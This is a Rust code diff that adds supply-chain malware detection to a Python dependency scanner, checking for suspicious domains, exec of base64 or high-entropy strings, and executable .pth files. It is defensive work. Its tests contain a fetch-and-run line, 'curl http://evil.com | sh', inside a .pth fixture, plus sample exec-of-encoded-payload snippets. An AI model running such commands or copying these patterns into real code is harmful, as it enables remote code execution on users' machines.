@@ -1,8 +1,95 @@
+use regex::Regex;
 use serde::{Deserialize, Serialize};
 use std::collections::{HashMap, HashSet};
 use std::path::Path;
 
 use super::tree::Ecosystem;
+
+/// Configuration for self-inspection: inspecting the root package itself.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct SelfInspectConfig {
+    pub package_name: String,
+    pub current_version: String,
+}
+
+/// A URL found in source code.
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct ExtractedUrl {
+    pub url: String,
+    pub domain: String,
+    pub file: String,
+    pub line: u32,
+    pub in_encoded_content: bool,
+}
+
+/// Extract URLs from Python source code.
+pub fn extract_urls(source: &str, file: &str) -> Vec<ExtractedUrl> {
+    let url_re = Regex::new(r#"https?://[a-zA-Z0-9\-._~:/?#\[\]@!$&'()*+,;=%]+"#).unwrap();
+    let mut urls = Vec::new();
+
+    for (i, line) in source.lines().enumerate() {
+        for m in url_re.find_iter(line) {
+            let url = m.as_str().to_string();
+            let domain = extract_domain(&url);
+            urls.push(ExtractedUrl {
+                url,
+                domain,
+                file: file.to_string(),
+                line: (i + 1) as u32,
+                in_encoded_content: false,
+            });
+        }
+    }
+
+    urls
+}
+
+fn extract_domain(url: &str) -> String {
+    url.trim_start_matches("https://")
+        .trim_start_matches("http://")
+        .split('/')
+        .next()
+        .unwrap_or("")
+        .split(':')
+        .next()
+        .unwrap_or("")
+        .to_string()
+}
+
+/// Check if extracted domains match official package URLs.
+/// Returns domains that DON'T match any official URL.
+pub fn find_suspicious_domains<'a>(
+    extracted: &'a [ExtractedUrl],
+    official_domains: &[String],
+) -> Vec<&'a ExtractedUrl> {
+    extracted
+        .iter()
+        .filter(|u| {
+            let domain = &u.domain;
+            // Skip common safe domains
+            let safe = [
+                "pypi.org",
+                "python.org",
+                "github.com",
+                "githubusercontent.com",
+                "readthedocs.io",
+                "readthedocs.org",
+                "sphinx-doc.org",
+                "example.com",
+                "localhost",
+                "127.0.0.1",
+                "0.0.0.0",
+            ];
+            if safe.iter().any(|s| domain.contains(s)) {
+                return false;
+            }
+            // Check against official domains
+            !official_domains
+                .iter()
+                .any(|od| domain.contains(od) || od.contains(domain.as_str()))
+        })
+        .collect()
+}
 
 /// A capability that Python code can exercise.
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
@@ -78,6 +165,25 @@ pub enum SuspiciousPattern {
     CredentialAccess { file: String, line: u32 },
     /// __import__ with string construction.
     ObfuscatedImport { file: String, line: u32 },
+    /// .pth file containing executable code (import/exec/subprocess/base64).
+    PthInjection {
+        file: String,
+        line: u32,
+        evidence: String,
+    },
+    /// exec/eval combined with high-entropy string or base64 decode.
+    EncodedExecution {
+        file: String,
+        line: u32,
+        evidence: String,
+    },
+    /// URL to a domain not matching the package's official URLs.
+    SuspiciousDomain {
+        file: String,
+        line: u32,
+        domain: String,
+        url: String,
+    },
 }
 
 /// Complete source-level diff for a dependency version change.
@@ -374,7 +480,8 @@ pub fn diff_source_dirs(
     }
 
     // Suspicious patterns: check each new/modified file for compound patterns
-    let suspicious_patterns = detect_suspicious_patterns(&new_files, &old_files);
+    let mut suspicious_patterns = detect_suspicious_patterns(&new_files, &old_files);
+    suspicious_patterns.extend(scan_pth_files(new_dir));
 
     // Risk scoring
     let risk_score = score_source_diff(
@@ -401,6 +508,83 @@ pub fn diff_source_dirs(
         suspicious_patterns,
         risk_score,
     }
+}
+
+/// Compute Shannon entropy in bits per character.
+fn shannon_entropy(s: &str) -> f64 {
+    if s.is_empty() {
+        return 0.0;
+    }
+    let mut freq = [0u32; 256];
+    for &b in s.as_bytes() {
+        freq[b as usize] += 1;
+    }
+    let len = s.len() as f64;
+    freq.iter()
+        .filter(|&&c| c > 0)
+        .map(|&c| {
+            let p = c as f64 / len;
+            -p * p.log2()
+        })
+        .sum()
+}
+
+/// Extract string literals from Python source and check for high entropy.
+/// Returns (line_number, the_string, entropy) for strings > 40 chars with entropy > 4.5.
+fn find_high_entropy_strings(source: &str) -> Vec<(u32, String, f64)> {
+    let mut results = Vec::new();
+    for (i, line) in source.lines().enumerate() {
+        let trimmed = line.trim();
+        for delim in ['"', '\''] {
+            let chars: Vec<char> = trimmed.chars().collect();
+            let mut j = 0;
+            while j < chars.len() {
+                if chars[j] == delim {
+                    // Check for triple-quote
+                    let triple =
+                        j + 2 < chars.len() && chars[j + 1] == delim && chars[j + 2] == delim;
+                    let end_delim = if triple { 3 } else { 1 };
+                    let start = j + end_delim;
+                    // Find closing delimiter
+                    let mut k = start;
+                    let mut found_end = false;
+                    while k < chars.len() {
+                        if triple {
+                            if k + 2 < chars.len()
+                                && chars[k] == delim
+                                && chars[k + 1] == delim
+                                && chars[k + 2] == delim
+                            {
+                                found_end = true;
+                                break;
+                            }
+                        } else if chars[k] == delim && (k == 0 || chars[k - 1] != '\\') {
+                            found_end = true;
+                            break;
+                        }
+                        k += 1;
+                    }
+                    if found_end && k > start {
+                        let s: String = chars[start..k].iter().collect();
+                        if s.len() > 40 {
+                            let ent = shannon_entropy(&s);
+                            if ent > 4.5 {
+                                results.push((
+                                    (i + 1) as u32,
+                                    s[..s.len().min(80)].to_string(),
+                                    ent,
+                                ));
+                            }
+                        }
+                    }
+                    j = k + end_delim;
+                } else {
+                    j += 1;
+                }
+            }
+        }
+    }
+    results
 }
 
 /// Detect suspicious compound patterns in new/modified files.
@@ -480,6 +664,44 @@ fn detect_suspicious_patterns(
                 }
             }
         }
+
+        // EncodedExecution: exec/eval + base64 in same file (regardless of network)
+        if cap_set.contains(&Capability::Process) && cap_set.contains(&Capability::Encoding) {
+            let line = caps
+                .iter()
+                .find(|c| c.capability == Capability::Process)
+                .map(|c| c.line)
+                .unwrap_or(0);
+            let evidence = caps
+                .iter()
+                .find(|c| c.capability == Capability::Process)
+                .map(|c| c.evidence.clone())
+                .unwrap_or_default();
+            patterns.push(SuspiciousPattern::EncodedExecution {
+                file: path.clone(),
+                line,
+                evidence,
+            });
+        }
+
+        // EncodedExecution: exec/eval + high-entropy string in same file
+        let has_exec =
+            content.contains("exec(") || content.contains("eval(") || content.contains("compile(");
+        if has_exec {
+            let high_entropy = find_high_entropy_strings(content);
+            if !high_entropy.is_empty() {
+                let (he_line, s, ent) = &high_entropy[0];
+                patterns.push(SuspiciousPattern::EncodedExecution {
+                    file: path.clone(),
+                    line: *he_line,
+                    evidence: format!(
+                        "exec/eval + high-entropy string (entropy={:.2}): {}...",
+                        ent,
+                        &s[..s.len().min(60)]
+                    ),
+                });
+            }
+        }
     }
 
     patterns
@@ -513,6 +735,9 @@ fn score_source_diff(
             SuspiciousPattern::DataExfiltration { .. } => 4.0,
             SuspiciousPattern::CredentialAccess { .. } => 4.0,
             SuspiciousPattern::ObfuscatedImport { .. } => 3.0,
+            SuspiciousPattern::PthInjection { .. } => 5.0,
+            SuspiciousPattern::EncodedExecution { .. } => 5.0,
+            SuspiciousPattern::SuspiciousDomain { .. } => 2.0,
         };
     }
 
@@ -529,6 +754,60 @@ fn score_source_diff(
     }
 
     score.min(10.0)
+}
+
+/// Scan for dangerous .pth files in a package directory.
+/// .pth files execute arbitrary Python code on every interpreter startup.
+pub fn scan_pth_files(dir: &Path) -> Vec<SuspiciousPattern> {
+    let mut patterns = Vec::new();
+    scan_pth_recursive(dir, dir, &mut patterns);
+    patterns
+}
+
+fn scan_pth_recursive(base: &Path, current: &Path, patterns: &mut Vec<SuspiciousPattern>) {
+    let entries = match std::fs::read_dir(current) {
+        Ok(e) => e,
+        Err(_) => return,
+    };
+    for entry in entries.flatten() {
+        let path = entry.path();
+        if path.is_dir() {
+            scan_pth_recursive(base, &path, patterns);
+        } else if path.extension().map(|e| e == "pth").unwrap_or(false) {
+            let rel = path
+                .strip_prefix(base)
+                .unwrap_or(&path)
+                .to_string_lossy()
+                .to_string();
+            if let Ok(content) = std::fs::read_to_string(&path) {
+                let dangerous_patterns = [
+                    "import ",
+                    "exec(",
+                    "eval(",
+                    "subprocess",
+                    "base64",
+                    "__import__",
+                    "os.system",
+                ];
+                for (line_num, line) in content.lines().enumerate() {
+                    let trimmed = line.trim();
+                    if trimmed.is_empty() || trimmed.starts_with('#') {
+                        continue;
+                    }
+                    for &dp in &dangerous_patterns {
+                        if trimmed.contains(dp) {
+                            patterns.push(SuspiciousPattern::PthInjection {
+                                file: rel.clone(),
+                                line: (line_num + 1) as u32,
+                                evidence: truncate_str(trimmed, 120),
+                            });
+                            break;
+                        }
+                    }
+                }
+            }
+        }
+    }
 }
 
 /// Collect all .py files from a directory recursively.
@@ -782,5 +1061,84 @@ mod tests {
             .capability_deltas
             .iter()
             .any(|d| d.capability == Capability::Network && d.is_escalation));
+    }
+
+    #[test]
+    fn shannon_entropy_high_for_base64() {
+        let base64_str = "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Qgb2YgYmFzZTY0IGVuY29kaW5n";
+        let ent = shannon_entropy(base64_str);
+        assert!(ent > 4.0, "base64 should have high entropy, got {ent}");
+    }
+
+    #[test]
+    fn shannon_entropy_low_for_repeated() {
+        let ent = shannon_entropy("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa");
+        assert!(ent < 0.1, "repeated chars should have low entropy, got {ent}");
+    }
+
+    #[test]
+    fn find_high_entropy_detects_base64_payload() {
+        let source = r#"PAYLOAD = "aGVsbG8gd29ybGQgdGhpcyBpcyBhIGxvbmcgYmFzZTY0IGVuY29kZWQgc3RyaW5nIHRoYXQgc2hvdWxkIGJlIGRldGVjdGVk""#;
+        let results = find_high_entropy_strings(source);
+        assert!(!results.is_empty(), "should detect high-entropy string");
+    }
+
+    #[test]
+    fn encoded_execution_base64_plus_exec() {
+        let mut new_files = HashMap::new();
+        new_files.insert(
+            "backdoor.py".to_string(),
+            "import base64\nPAYLOAD = 'aGVsbG8gd29ybGQ='\nexec(base64.b64decode(PAYLOAD))\n"
+                .to_string(),
+        );
+        let old_files = HashMap::new();
+        let patterns = detect_suspicious_patterns(&new_files, &old_files);
+        assert!(
+            patterns
+                .iter()
+                .any(|p| matches!(p, SuspiciousPattern::EncodedExecution { .. })),
+            "should detect exec + base64 as EncodedExecution"
+        );
+    }
+
+    #[test]
+    fn encoded_execution_high_entropy_plus_exec() {
+        let mut new_files = HashMap::new();
+        new_files.insert(
+            "stealer.py".to_string(),
+            "PAYLOAD = 'eJzLSM3JyVcozy/KSQEAGgsEHQ==aGVsbG8gd29ybGQgZm9vIGJhciBiYXogcXV4IHF1dXggY29yZ2UgZ3JhdWx0IGdhcnBseSB3YWxkbw=='\nexec(compile(PAYLOAD, '<string>', 'exec'))\n"
+                .to_string(),
+        );
+        let old_files = HashMap::new();
+        let patterns = detect_suspicious_patterns(&new_files, &old_files);
+        assert!(
+            patterns
+                .iter()
+                .any(|p| matches!(p, SuspiciousPattern::EncodedExecution { .. })),
+            "should detect exec + high-entropy string as EncodedExecution"
+        );
+    }
+
+    #[test]
+    fn pth_injection_detected() {
+        let dir = tempfile::tempdir().unwrap();
+        let pth_path = dir.path().join("evil.pth");
+        std::fs::write(&pth_path, "import os; os.system('curl http://evil.com | sh')\n").unwrap();
+        let patterns = scan_pth_files(dir.path());
+        assert!(!patterns.is_empty(), "should detect .pth injection");
+        assert!(matches!(
+            &patterns[0],
+            SuspiciousPattern::PthInjection { .. }
+        ));
+    }
+
+    #[test]
+    fn pth_safe_path_not_flagged() {
+        let dir = tempfile::tempdir().unwrap();
+        let pth_path = dir.path().join("safe.pth");
+        // Normal .pth files just contain directory paths
+        std::fs::write(&pth_path, "/usr/lib/python3/dist-packages\n./lib\n").unwrap();
+        let patterns = scan_pth_files(dir.path());
+        assert!(patterns.is_empty(), "safe .pth should not be flagged");
     }
 }
